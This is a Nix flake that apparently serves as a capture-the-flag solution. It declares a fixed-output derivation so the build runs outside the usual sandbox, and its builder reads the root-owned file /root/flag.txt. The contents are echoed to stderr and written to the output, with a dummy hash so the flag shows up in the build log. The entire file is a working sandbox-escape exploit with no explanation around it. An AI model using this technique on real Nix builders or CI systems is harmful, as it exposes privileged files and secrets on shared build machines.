{
  description = "Phoenix";

  outputs = { self }: {
    packages.x86_64-linux.default =
      builtins.derivation {
        name = "flag";
        system = "x86_64-linux";

        # Fixed-output derivations are allowed outside the normal sandbox.
        outputHashMode = "flat";
        outputHashAlgo = "sha256";
        outputHash = "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

        builder = "/bin/sh";

        args = [
          "-c"
          ''
            FLAG="$(cat /root/flag.txt)"
            echo "PHOENIX_FLAG=$FLAG" >&2
            printf '%s' "$FLAG" > "$out"
          ''
        ];
      };
  };
}